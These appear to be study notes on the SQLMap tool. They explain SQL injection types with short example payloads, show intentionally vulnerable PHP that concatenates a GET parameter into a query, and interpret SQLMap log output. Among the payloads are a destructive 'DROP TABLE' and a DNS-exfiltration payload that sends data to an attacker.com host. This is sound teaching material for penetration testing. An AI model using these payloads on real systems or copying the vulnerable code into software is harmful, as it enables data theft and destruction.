## SQLMap Overview

[SQLMap](https://github.com/sqlmapproject/sqlmap) is a free tool written in Python, which automates the process of detecting and exploiting SQL Injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.

SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:

|   |   |   |
|---|---|---|
|Target connection|Injection detection|Fingerprinting|
|Enumeration|Optimization|Protection detection and bypass using "tamper" scripts|
|Database content retrieval|File system access|Execution of the operating system (OS) commands|

### Supported Databases

SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:

|   |   |   |   |
|---|---|---|---|
|`MySQL`|`Oracle`|`PostgreSQL`|`Microsoft SQL Server`|
|`SQLite`|`IBM DB2`|`Microsoft Access`|`Firebird`|
|`Sybase`|`SAP MaxDB`|`Informix`|`MariaDB`|
|`HSQLDB`|`CockroachDB`|`TiDB`|`MemSQL`|
|`H2`|`MonetDB`|`Apache Derby`|`Amazon Redshift`|
|`Vertica`, `Mckoi`|`Presto`|`Altibase`|`MimerSQL`|
|`CrateDB`|`Greenplum`|`Drizzle`|`Apache Ignite`|
|`Cubrid`|`InterSystems Cache`|`IRIS`|`eXtremeDB`|
|`FrontBase`|

The SQLMap team also works to add and support new DBMSes periodically.

### Supported Injection Types

SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types. We see the types of SQL injections supported by SQLMap with the `sqlmap -hh` command:
```shell-session
$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

### Boolean-based Blind SQL Injection

Example:
```sql
AND 1=1
```

This is a technique of exploiting the database through the differentiation of TRUE from FALSE query results. This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.

- `TRUE` results are generally based on responses having none or marginal difference to the regular server response.
    
- `FALSE` results are based on responses having substantial differences from the regular server response.
    
- `Boolean-based blind SQL Injection` is considered as the most common SQLi type in web applications.

### Error-based SQL Injection

Example
```sql
AND GTID_SUBSET(@@version,0)
```

If the database management system (DBMS) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results of the requested queries. In such cases specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. SQLMap has the most comprehensive list of such related payloads and covers `Error-based SQL Injection` for the following DBMSes:

|   |   |   |
|---|---|---|
|MySQL|PostgreSQL|Oracle|
|Microsoft SQL Server|Sybase|Vertica|
|IBM DB2|Firebird|MonetDB|

Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.

### UNION Query-based

Example:
```sql
UNION ALL SELECT 1,@@version,3
```

With UNION, it is generally possible to extend the results. The attacker can get additional results from the injected statements within the page response itself. This type of SQLi is considered the fastest, as, in the ideal scenario it's possible to pull the content of the whole database table with a single request.

### Stacked Queries

Example:
```sql
; DROP TABLE users
```

Stacking SQL queries, also known as the "piggy-backing", is the form of injecting additional SQL statements after the vulnerable one. In case there is a requirement for running non-query statements (e.g. `INSERT`, `UPDATE` or `DELETE`), stacking must be supported by the vulnerable platform (e.g., `Microsoft SQL Server` and `PostgreSQL` support it by default). SQLMap can use it to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi injection types.

### Time-based Blind SQL Injection

Example:
```sql
AND 1=IF(2>1,SLEEP(5),0)
```

The principle is similar to Boolean-based, but here the response time is used as the source of differentiation between TRUE or FALSE.

- `TRUE` response is generally characterized by the noticeable difference in the response time compared to the regular server response
    
- `FALSE` response should result in a response time indistinguishable from regular response times

This is considered slower then Boolean-based, since queries resulting in TRUE will delay the server response. This is used when Boolean-based isn't applicable. For example when the vulnerable SQL statement is a non-query (e.g. `INSERT`, `UPDATE` or `DELETE`), executed as part of the auxiliary functionality without any effect to the page rendering process.

### Inline Queries

Example:
```sql
SELECT (SELECT @@version) from
```

This type of injection embedded a query within the original query. Such type of SQLi is uncommon, since the vulnerable web app should be written in a certain way. Still SQLMap supports it.

### Out-of-band SQL Injection

Example:
```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

This is considered one of the most advanced types of SQLi, used in cases where all other types are unsupported by the web app or are too slow. SQLMap supports out-of-band SQLi through "DNS exfiltration", where requested queries are retrieved through DNS traffic.

By running the SQLMap on the DNS server for the domain under control (e.g. `.attacker.com`), SQLMap can force the server to request non-existent subdomains (e.g. `foo.attacker.com`), where `foo` would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the `foo` part, to form the entire SQL response.

## Getting Started with SQLMap

There are tow levels of help message listing:

- Basic Listing shows only the basic options and switches (`-h`).
- Advanced Listing shows all options and switches (`-hh`).

For more details, users are advised to consult the project's [wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage), as it represents the official manual for SQLMap's usage.

### Basic Scenerio

In a simple scenario, the web page accepts user input via GET parameter. The attacker wants to test if the page is vulnerable. If so they would want to exploit it, retrieve as much information as possble from the back-end database, or even try to access the underlying file system and execute OS commands. An example of SQLi vulnerable PHP code for this scenario would look as follows:
```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

AS error reporting is enabled for the vulnerable SQL query, there will be a database error returned as part of the web-server response in case of any SQL query execution problems. Such cases ease the process of SQLi detection, especially in case of manual parameter value tempering, as the resulting errors are easily recognized:
![[rOrm8tC.webp]]

To run SQL map against this example, located at the example URL `http://www.example.com/vuln.php?id=1`, would look like the following:
```shell-session
$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.

## SQLMap Output Description

### URL Content is Stable

`Log Message:`

- "target URL content is stable"

This means that there are no major changes between responses to identical requests. This makes it easier to spot differences caused by the potential SQLi attempts. SQLMap also has advanced mechanisms to automatically remove the potential "noise" that could come from the potentially unstable targets.

### Parameter Appears to be Dynamic

`Log Message:`

- "GET parameter 'id' appears to be dynamic"

Tis is a sign that any changes made to the value would result in a change in the response; hence the parameter may be linked to the database. In case the output is static, it can indicate that the parameter is not being process, at least in the current context.

### Parameter Might be Injectable

`Log Message:` 

- "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"

There was a MySQL error when SQLMap sends an intentionally invalid value (e.g. `?id=1",)..).))'`), which indicates that the tested parameter could be SQLi injectable and that the target could be MySQL.

### Parameter Might be Vulnerable to XSS Attacks

`Log Message:`

- "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"

SQLMap also runs a quick heuristic test for the presence of an XSS vulnerability.

### Back-end DBMS is '...'

`Log Message:`

- "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"

In a normal run SQLMap tests for all supported DBMSes. In case there is a clear indication of particular DBMS, we can narrow down the payloads to just that specific DBMS.

### Level/Risk Value

`Log Message:`

- "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"

If there is a clear indication that the target uses the specific DBMS, it's also possible to extend the tests for that same specific DBMS beyond the regular tests (top payloads).

### Reflective Values Found

`Log Message:`

- "reflective value(s) found and filtering out"

Just a warning that same of the used payloads are found in the response. It could cause problems to automation tools, as it represents the junks. However SQLMap has filtering mechanisms to remove such junk before comparing the original page content.

### Parameter Appears to be Injectible

`Log Message:`

- "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"

The message indicates that the parameter appears to be vulnerable, but there is still a chance of false-positive. In the case of Boolean-based blind SQLi and similar, where there is a high chance of false-positives, at the end of the run, SQLMap performs extensive testing consisting of simple logic checks for removal of false-positive findings.

Additionally, `with --string="luther"` indicates the appearance of constant string value `luther` in the response for distinguishing `TRUE` from `FALSE` responses. in such cases, there is no need for the usage of advanced internal mechanisms, such as dynamicity/reflection removal or fuzzy comparison of responses, which cannot be considered as false-positive.

### Time-based Comparison Statistical Model

`Log Message:`

- "time-based comparison requires a larger statistical model, please wait........... (done)"

SQLMap uses statistical model for the recognition of regular and (deliberately) delayed target responses. For this model to work, a sufficient number of regular response times is required. This way, SQLMap can statistically distinguish between the deliberate delay even in the high-latency network environments.

### Extending UNION Query Injection Techniques Tests

`Log Message:`

- "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"

UNION-query SQLi checks require considerably more requests for successful recognition of usable payload then other SQLi types. To lower the testing time per parameter, especially if the target doesn't appear to be injectable, the number of requests is capped to a constant value. However if there is a chance that the target is vulnerable, especially as one other (potential) SQLi technique is found, SQLMap extends the default number of requests for UNION query SQLi, because of a higher expectancy of success.

### Technique Appear to be Usable

`Log Message:`

- "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"

As a heuristic check for the UNION-query, before the actual payloads are sent, a technique known as `ORDER BY` is checked for usability. In case that this is usable SQLMap can quickly recognize the number of required UNION columns by conducting the binary search approach.

Note that this depends on the affected table in the vulnerable query.

### Parameter is Vulnerable

`Log Message:`

- "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"

The parameter was found to be vulnerable. We can choose to only work with this parameter, or continue searching for other vulnerable parameters.

### Sqlmap Identified Injection Points

`Log Message:`

- "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"

Following after is a listing of all injection points with type, title, and payloads, which represents the final proof of successful detection and exploitation of found SQLi vulnerabilities. It should be noted that SQLMap lists only those findings which are provably exploitable (i.e., usable).

### Data Logged to Text Files

`Log Message:`

- "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"

That indicates the local file system location used for storing all logs, sessions and output data for a specific target - in this case `www.example.com`. After such an initial run, where the injection point is successfully detected, all details for future runs are stored inside the same directory's session files.